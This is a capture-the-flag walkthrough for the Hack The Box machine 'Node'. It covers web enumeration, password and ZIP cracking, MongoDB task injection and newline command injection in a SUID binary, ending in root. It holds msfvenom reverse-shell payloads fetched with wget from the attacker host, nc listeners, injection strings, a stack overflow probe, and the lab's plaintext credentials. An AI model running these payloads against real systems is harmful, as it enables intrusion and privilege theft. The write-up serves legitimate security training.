# [Node](https://app.hackthebox.eu/machines/110)

Start with `nmap`:

```bash
# find open TCP ports
sudo masscan -p1-65535 10.10.10.58 --rate=1000 -e tun0 > masscan.txt
tcpports=$(cat masscan.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -n | tr '\n' ',' | sed 's/,$//')
# TCP deep scan
sudo nmap -sS -p $tcpports -oA tcp --open -Pn --script "default,safe,vuln" -sV 10.10.10.58 &
# TCP quick scan
sudo nmap -v -sS -sC -F --open -Pn -sV 10.10.10.58
# UDP quick scan
sudo nmap -v -sU -F --open -Pn 10.10.10.58
```

The TCP quick scan returns the following:

![nmap1](./node/nmap1.png)

It seems like there is an HTTP service running on TCP port 3000. Start the following web scanner:

```bash
nikto -h http://10.10.10.58:3000/ -C all --maxtime=120s --output=nikto.txt
```

![nikto1](./node/nikto1.png)

What is with all these interesting files reported? Manually browse to the website `http://10.10.10.58:3000/`:

![web1](./node/web1.png)

Looks like a website. Start a web directory scanner:

```bash
ulimit -n 8192 # prevent file access error during gobuster scanning
gobuster dir -t 50 -r -q -z -o gobuster.txt \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -u http://10.10.10.58:3000/ &
```

But this returns an error:

```
Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.10.58:3000/6ba59336-8627-401e-a86d-262246afd4f2 => 200. To force processing of Wildcard responses, specify the '--wildcard' switch
```

Hmmm, it seems this website is not a good candidate for directory enumeration. The website mentions 3 usernames on the main site. Clicking on their names opens an empty profile page for each person:

![web2](./node/web2.png)

Looking at the HTML source, shows that the images are at `/uploads`:

```html
<img class="img-circle" style="max-width: 200px; margin-bottom: 15px;" alt="tom" ng-src="uploads/tom.jpg" src="uploads/tom.jpg">
```

Maybe that info will help later? The website has a login form:

![web3](./node/web3.png)

Trying some logins generates an `Login Failed` message. Looking at the request in the FireFox debugger, shows it was a HTTP POST with JSON data:

![web4](./node/web4.png)

The response for a bad login is the following JSON:

```json
{"error":true,"message":"Authentication failed"}
```

Use this info to make the following bruteforce attempt:

```bash
# create list of usernames
echo 'tom'  > users.txt
echo 'mark' >> users.txt
echo 'rastating' >> users.txt
# copy over wordlist
cp /usr/share/wordlists/rockyou.txt.gz .
gunzip rockyou.txt.gz
# attempt to brute-force
hydra 10.10.10.58 http-form-post "/api/session/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=Authentication failed" -s 3000 -L users.txt -P rockyou.txt -vV -f
```

While that runs take a closer look at the HTML source code of the main page and see the following JavaScript includes:

![web5](./node/web5.png)

Take a look at the custom ones that are not "minified":

```
http://10.10.10.58:3000/assets/js/app/app.js
http://10.10.10.58:3000/assets/js/app/controllers/home.js
http://10.10.10.58:3000/assets/js/app/controllers/login.js
http://10.10.10.58:3000/assets/js/app/controllers/admin.js
http://10.10.10.58:3000/assets/js/app/controllers/profile.js
```

From these, there are some interesting entries:

```javascript
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// http://10.10.10.58:3000/assets/js/app/app.js
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
var controllers = angular.module('controllers', []);
var app = angular.module('myplace', [ 'ngRoute', 'controllers' ]);

app.config(function ($routeProvider, $locationProvider) {
  $routeProvider.
    when('/', {
      templateUrl: '/partials/home.html',
      controller: 'HomeCtrl'
    }).
    when('/profiles/:username', {
      templateUrl: '/partials/profile.html',
      controller: 'ProfileCtrl'
    }).
    when('/login', {
      templateUrl: '/partials/login.html',
      controller: 'LoginCtrl'
    }).
    when('/admin', {
      templateUrl: '/partials/admin.html',
      controller: 'AdminCtrl'
    }).
    otherwise({
      redirectTo: '/'
    });

    $locationProvider.html5Mode(true);
});
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// http://10.10.10.58:3000/assets/js/app/controllers/home.js
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
var controllers = angular.module('controllers');

controllers.controller('HomeCtrl', function ($scope, $http) {
  $http.get('/api/users/latest').then(function (res) {
    $scope.users = res.data;
  });
});
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// http://10.10.10.58:3000/assets/js/app/controllers/login.js
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
var controllers = angular.module('controllers');

controllers.controller('LoginCtrl', function ($scope, $http, $location) {
  $scope.authenticate = function () {
    $scope.hasError = false;

    $http.post('/api/session/authenticate', {
      username: $scope.username,
      password: $scope.password
    }).then(function (res) {
      if (res.data.success) {
        $location.path('/admin');
      }
      else {
        $scope.hasError = true;
        $scope.alertMessage = 'Incorrect credentials were specified';
      }
    }, function (resp) {
      $scope.hasError = true;
      $scope.alertMessage = 'An unexpected error occurred';
    });
  };
});
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// http://10.10.10.58:3000/assets/js/app/controllers/admin.js
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
var controllers = angular.module('controllers');

controllers.controller('AdminCtrl', function ($scope, $http, $location, $window) {
  $scope.backup = function () {
    $window.open('/api/admin/backup', '_self');
  }

  $http.get('/api/session')
    .then(function (res) {
      if (res.data.authenticated) {
        $scope.user = res.data.user;
      }
      else {
        $location.path('/login');
      }
    });
});
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// http://10.10.10.58:3000/assets/js/app/controllers/profile.js
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
var controllers = angular.module('controllers');

controllers.controller('ProfileCtrl', function ($scope, $http, $routeParams) {
  $http.get('/api/users/' + $routeParams.username)
    .then(function (res) {
      $scope.user = res.data;
    }, function (res) {
      $scope.hasError = true;

      if (res.status == 404) {
        $scope.errorMessage = 'This user does not exist';
      }
      else {
        $scope.errorMessage = 'An unexpected error occurred';
      }
    });
});
```

It seems like there is an admin portal at `/admin` that requires authentication. There also seems to be some kind of API backend being used through Ajax queries. Here are some of the interesting API URLs:

```
http://10.10.10.58:3000/api/admin/backup
http://10.10.10.58:3000/api/session
http://10.10.10.58:3000/api/users/latest
```

Trying the backup URL requires authentication. The session URL just returns if the current client is authenticated? However, the last URL for users has some juicy response data:

![web6](./node/web6.png)

Those are password hashes. Try cracking them:

- The hashes look like SHA-256: https://hashcat.net/wiki/doku.php?id=example_hashes

```bash
echo 'f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240'  > web.hash # tom
echo 'de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73' >> web.hash # mark
echo '5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0' >> web.hash # rastating
# try to crack hashes
cp /usr/share/wordlists/rockyou.txt.gz .
gunzip rockyou.txt.gz
hashcat -m 1400 -a 0 --quiet --force --potfile-disable web.hash rockyou.txt
```

And this has some hits!

![hash1](./node/hash1.png)

This means the following credentials _may_ be valid (this is assuming there is no salt in those hashes...):

```
tom/spongebob
mark/snowflake
```

Trying these credentials shows the following page with similar content for each login:

![web7](./node/web7.png)

From here, it is likely that the next step is to try and trigger the `$scope.backup()` function call from `admin.js`. This is because, looking at the HTML for the page after a valid login shows some interesting comments:

![web8](./node/web8.png)

The DOM templating seems to be pivoting off the value of `user.is_admin`. Maybe it is possible to set this value? From here, some reading is needed to understand what is going on to move further:

- https://docs.angularjs.org/guide/introduction
- https://angularjs.org/
- https://blog.nvisium.com/angular-for-pentesters-part-1
- https://www.toptal.com/angular-js/top-18-most-common-angularjs-developer-mistakes
- https://stackoverflow.com/questions/17656244/how-to-change-angularjs-data-outside-the-scope

So the value of `$scope` used in all the JavaScript files is a session context passed between views. It is possible to modify this value in the client browser and have the angularJS templating context re-render the DOM as if this change was sent from the server. **NOTE that this is not the same thing as actually modifiying the server response**. The actual session context is managed through a client session cookie and is mapped to the real session context on the server. However, it is possible to abuse the fact that angularJS is a front-end framework and provides all the power to the user in their browser. It allows for a user to render the DOM as other users by changing the browser context or `$scope`. First, after logging in, display all the variables in the current scope:

- The `ng-app=myplace` was found by looking at the DOM to find where the `ng-app` HTML attribute was defined. This DOM element is what holds the `$scope` context.

```javascript
var $scope = angular.element(document.querySelector('[ng-app=myplace]')).scope();
$scope = $scope.$$childHead; 
for (var k in $scope) {
  if ($scope.hasOwnProperty(k) && (k[0] != '$')) {
    console.log('[' + k + '] = ', $scope[k]);
  }
}
```

Running the above JavaScript in the browser console shows the following:

![web9](./node/web9.png)

This shows the `backup` and `user` variables added to the `$scope` in `assets/js/app/controllers/profile.js`. Try modifying the value of `user.is_admin`:

```javascript
$scope.$apply(function() {
  $scope.user.is_admin = true;
});
```

Running this JavaScript in the browser console renders a new page:

![web10](./node/web10.png)

Looking at the HTML source shows what is expected:

![web11](./node/web11.png)

So the `backup()` function is the goal here. Calling it basically calls `window.open()` in JavaScript to replace the current DOM:

- https://www.w3schools.com/jsref/met_win_open.asp

But trying to browse to this page still generates an authentication error since the session cookie is not an admin one... Looking back at the API URLS shows that browsing to `http://10.10.10.58:3000/api/users/` returns a new value:

![web12](./node/web12.png)

That is a new hash. Try and crack it:

```bash
# myP14ceAdm1nAcc0uNT
echo 'dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af' > web.hash 
# try to crack hash
hashcat -m 1400 -a 0 --quiet --force --potfile-disable web.hash rockyou.txt
```

And this results in a win!

![hash2](./node/hash2.png)

Use `myP14ceAdm1nAcc0uNT/manchester` to login as the admin and click on the backup button. This downloads a file that looks base64 encoded:

![file1](./node/file1.png)

Decoding it produces a password-protected ZIP archive:

```bash
cat myplace.backup | base64 -d > myplace.bin
file myplace.bin
unzip myplace.bin
```

![file2](./node/file2.png)

Get the password hash and try to crack it:

- File looks like PKZIP (Mixed Multi-File): https://hashcat.net/wiki/doku.php?id=example_hashes

```bash
zip2john myplace.bin | cut -d ':' -f 2 > zip.hash
hashcat -m 17225 -a 0 --quiet --force --potfile-disable zip.hash rockyou.txt
```

And this also has a win!

![hash3](./node/hash3.png)

Now unzip the file to reveal the source code for the application. The application looks like NodeJS from the top level directory:

![file3](./node/file3.png)

Since that is true, the main file to look at here is `app.js`:

```javascript
const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  app.use(session({
    secret: 'the boundless tendency initiates the law.',
    cookie: { maxAge: 3600000 },
    resave: false,
    saveUninitialized: false
  }));

  app.use(function (req, res, next) {
    var agent = req.headers['user-agent'];
    var blacklist = /(DirBuster)|(Postman)|(Mozilla\/4\.0.+Windows NT 5\.1)|(Go\-http\-client)/i;

    if (!blacklist.test(agent)) {
      next();
    }
    else {
      count = Math.floor((Math.random() * 10000) + 1);
      randomString = '';

      var charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      for (var i = 0; i < count; i++)
        randomString += charset.charAt(Math.floor(Math.random() * charset.length));

      res.set('Content-Type', 'text/plain').status(200).send(
        [
          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ',
          'QQQQQQQQQQQQQP\'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,"?9$QQQQQQQQQQQQQQ',
          'QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ',
          'QQQQQQQQQQW\' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ',
          'QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ',
          'QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ',
          'QQQQQQQP\'.yQQQQQQQQQQQP"       <wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQQ',
          'QQQQQP\'_a.<aamQQQW!<yF "!` ..  "??$Qa "WQQQWTVP\'    "??\' =QQmWWV?46/ ?QQQQQ',
          'QQQP\'sdyWQP?!`.-"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ',
          'QQ[ j@mQP\'adQQP4ga, -????" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQQ',
          'QW jQkQ@ jWQQD\'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc "4QQQQa   .QP4QQQQfWkl jQQQ',
          'QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQD\Qf(.QWQQ',
          'QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ',
          'QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??\'<mWWWWWQW?^  ` ]6QQ\' yQQQQQ',
          'QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ',
          'QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ',
          'QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ',
          'QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ',
          'QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ\'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ',
          'QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ',
          'QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ',
          'QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ',
          'QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ',
          'QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ',
          'QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ',
          'QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW',
          'QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ',
          'QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ',
          'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ',
          'QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ',
          '',
          '',
          '<!-- ' + randomString + ' -->'
        ].join("\n")
      );
    }
  });

  app.use(express.static(path.join(__dirname, 'static')));
  app.use(bodyParser.json());
  app.use(function(err, req, res, next) {
    if (err) {
      res.status(err.status || 500);
      res.send({
        message:"Uh oh, something went wrong!",
        error: true
      });
    }
    else {
      next();
    }
  });

  app.get('/api/users/?', function (req, res) {
    db.collection('users').find().toArray(function (error, docs) {
      if (error) {
        res.status(500).send({ error: true });
      }
      else if (!docs) {
        res.status(404).send({ not_found: true });
      }
      else {
        res.send(docs);
      }
    });
  });

  app.get('/api/users/latest', function (req, res) {
    db.collection('users').find({ is_admin: false }).toArray(function (error, docs) {
      if (error) {
        res.status(500).send({ error: true });
      }
      else if (!docs) {
        res.status(404).send({ not_found: true });
      }
      else {
        res.send(docs);
      }
    });
  });

  app.get('/api/users/:username', function (req, res) {
    db.collection('users').findOne({ username: req.params.username }, function (error, doc) {
      if (error) {
        res.status(500).send({ error: true });
      }
      else if (!doc) {
        res.status(404).send({ not_found: true });
      }
      else {
        res.send(doc);
      }
    });
  });

  app.get('/api/session', function (req, res) {
    if (req.session.user) {
      res.send({
        authenticated: true,
        user: req.session.user
      });
    }
    else {
      res.send({
        authenticated: false
      });
    }
  });

  app.post('/api/session/authenticate', function (req, res) {
    var failureResult = {
      error: true,
      message: 'Authentication failed'
    };

    if (!req.body.username || !req.body.password) {
      res.send(failureResult);
      return;
    }

    db.collection('users').findOne({ username: req.body.username }, function (error, doc) {
      if (error) {
        res.status(500).send({
          message:"Uh oh, something went wrong!",
          error: true
        });

        return;
      }

      if (!doc) {
        res.send(failureResult);
        return;
      }

      var hash = crypto.createHash('sha256');
      var cipherText = hash.update(req.body.password).digest('hex');

      if (cipherText == doc.password) {
        req.session.user = doc;
        res.send({
          success: true
        });
      }
      else {
        res.send({
          success: false
        })
      }
    });
  });

  app.get('/api/admin/backup', function (req, res) {
    if (req.session.user && req.session.user.is_admin) {
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
      var backup = '';

      proc.on("exit", function(exitCode) {
        res.header("Content-Type", "text/plain");
        res.header("Content-Disposition", "attachment; filename=myplace.backup");
        res.send(backup);
      });

      proc.stdout.on("data", function(chunk) {
        backup += chunk;
      });

      proc.stdout.on("end", function() {
      });
    }
    else {
      res.send({
        authenticated: false
      });
    }
  });

  app.use(function(req, res, next){
    res.sendFile('app.html', { root: __dirname });
  });

  app.listen(3000, function () {
    console.log('MyPlace app listening on port 3000!')
  });

});
```

The file is not too long to include here completely. There are some important notes here:

- The server was running a blacklist on the `User-Agent` HTTP header to prevent directory enumeration. Simply setting a non-default header would have allowed for `gobuster` to run.
- `/api/admin/backup` actually calls a binary at `/usr/local/bin/backup` with the following key: 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
- The server has a database at `mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace`. This means the database credentials are `mark/5AYRft73VtFpc84k`

The credentials for `mark` are likely local to the target machine. Try them over SSH:

![user1](./node/user1.png)

This provides access to the target, but not `user.txt`? It seems like the next step is to move laterally to `tom` or escalate... Now there are a few things that are interesting on this machine. First, under the goal of moving laterally, there seems to be a unique process running as `tom`:

```bash
ps -ef | grep tom
```

![user2](./node/user2.png)

Looking at the content of `/var/scheduler/app.js` shows the following:

```javascript
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

It seems like `tom` is running a local NodeJS app that is executing tasks from a database managed by `mark`. Use this to get a reverse shell:

- https://stackabuse.com/executing-shell-commands-with-node-js/
- https://zellwk.com/blog/local-mongodb/

```bash
# on kali, generate payload
msfvenom -p linux/x86/shell_reverse_tcp \
         LHOST=10.10.14.27 \
         LPORT=6969 \
         -f elf \
         -o bubba.tom.elf
# on kali, host payload
sudo python3 -m http.server 80
# on kali, setup listener
nc -nvlp 6969
# on target, download and stage payload
wget -O /tmp/bubba.tom.elf http://10.10.14.27/bubba.tom.elf
chmod +x /tmp/bubba.tom.elf
# on target, connect to local mongodb as mark and add payload
mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler
show collections
db.tasks.insert({ cmd: "/tmp/bubba.tom.elf &" })
```

![user3](./node/user3.png)

Then after waiting for a bit, a new shell is given with `user.txt`:

![user4](./node/user4.png)

This user seems to have Sudo privileges (from `id` output) but the password is unknown so viewing them is not possible? 

- https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe

This lateral move seems like a deadend at this point? This changes after looking for some SUID binaries:

```bash
find / -perm -u=s -type f -exec ls -lad {} \; 2>/dev/null
```

![user5](./node/user5.png)

The binary `/usr/local/bin/backup` is not common and matches the binary from `app.js` for the NodeJS web application for the URL `/api/admin/backup`. Also, the binary is only executable by users in the `admin` group, which `tom` is a part of. Download the binary to Kali over SCP and load it into [Ghidra](https://ghidra-sre.org/) for reversing:

```bash
scp mark@10.10.10.58:/usr/local/bin/backup . # password 5AYRft73VtFpc84k
wget https://ghidra-sre.org/ghidra_9.1.2_PUBLIC_20200212.zip
unzip ghidra_9.1.2_PUBLIC_20200212.zip
sudo apt install openjdk-11-jdk
cd ghidra_9.1.2_PUBLIC/
./ghidraRun
```

After creating a new non-shared project and importing the binary, the `main()` function has the following tail end in the disassembly window:

![user6](./node/user6.png)

There are a few `system()` calls here with commands that receive user input from `argv[3]`. Maybe there is a command injection vulnerability to exploit here to become `root`? Also, looking through the binary, the following base64 string is commonly used:

```
UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
```

Take this and try to see what it contains:

```bash
# above saved in file.b64
cat file.b64 | base64 -d > file.bin
file file.bin
```

![user7](./node/user7.png)

The file seems to be another ZIP archive, extract it. However, the following error is given after running `unzip file.bin`:

```
Archive:  file.bin
   skipping: root.txt                need PK compat. v5.1 (can do v4.6)
```

A Google of the error leads to the following:

- https://askubuntu.com/questions/596761/error-while-unzipping-need-pk-compat-v5-1-can-do-v4-6

Trying `7z x file.bin` asks for another password for `root.txt`:

![user8](./node/user8.png)

This seems like a hack. Skip for now... Looking at Ghidra shows that this base64 string with `root.txt` is returns whenever the user input for `argv[3]` meets any of the following conditions:

- Contains `..`
- Contains `/root`
- Contains `;`
- Contains `&`
- Contains the [shell backtick](https://www.stat.berkeley.edu/~spector/extension/perl/notes/node73.html)
- Contains `$`
- Contains `|`
- Contains `//`
- Contains `/etc`
- Starts with `/`

Here is an example of this check in `main()` from Ghidra:

![user9](./node/user9.png)

This seems like a poor-man's blacklist for shell escape characters. The rest of the function `main()` just verifies the other command line arguments:

- `argv[0]` = `/usr/local/bin/backup`
- `argv[1]` = `-q` for quiet output. Anything else is ignored here
- `argv[2]` = Some key that requires verification? There is an example key in `/var/www/myplace/app.js`. This one will probably work: 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
- `argv[3]` = The target directory that is checked against the blacklist. It it passes it is inserted into the following command as the `%s`: `/usr/bin/zip -r -P magicword /tmp/.backup %s > /dev/null`

The blacklist is pretty comprehensive but does not contains any filtering for a newline. It should be possible to insert new commands into the call to `system()` as `root` by adding newlines. Test this with the following command to run in the reverse shell as `tom`:

- **NOTE:** The newline in the last argument is critical!

```bash
# try to make a new file at /tmp/bubba
/usr/local/bin/backup whatever 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "bubba
touch /tmp/bubba"
# see if it worked
ls -la /tmp/bubba
```

And this make a new file as `root`!

![user10](./node/user10.png)

Use this to get a reverse shell as `root`:

- **NOTE:** The `PrependSetuid` is needed to take advantage of the SUID binary!

```bash
# on kali, generate payload 
msfvenom -p linux/x86/shell_reverse_tcp \
         LHOST=10.10.14.27 \
         LPORT=7777 \
         PrependSetuid=true \
         -f elf \
         -o bubba.root.elf
# on kali, host payload
sudo python3 -m http.server 80
# on kali, setup listener
nc -nvlp 7777
# on target, download and stage payload
wget -O /tmp/bubba.root.elf http://10.10.14.27/bubba.root.elf
chmod +x /tmp/bubba.root.elf
# on target, **as tom**, trigger command injection
/usr/local/bin/backup -bubba 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "bubba
chown root:root /tmp/bubba.root.elf
chmod u+s /tmp/bubba.root.elf"
```

![user11](./node/user11.png)

Then check and trigger the payload:

![user12](./node/user12.png)

And this gives the `root` shell:

![root1](./node/root1.png)

----

There is also another way :wink: The code in `main()` calls an interesting function:

![root2](./node/root2.png)

The code for `displayTarget()` is the following:

![root3](./node/root3.png)

That is definitely a vulnerable function. The `target` parameter is the user input for `argv[3]` and is directly passed into a `strcpy()` call to a stack buffer of 508 bytes. Getting control of this stack address is rather simple. Here is the relevant assembly from Ghidra for this function:

![root4](./node/root4.png)

The location of the `local_buf` is 508 bytes from the old `EBP` of `main()`. This means that writing 512 bytes will overwrite old `EBP` and writing 514 bytes will overwrite `EIP` for returning to `main()`. Test the theory on the target to cause a segmentation fault:

```bash
/usr/local/bin/backup bubba 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python -c "print('A'*520)")
```

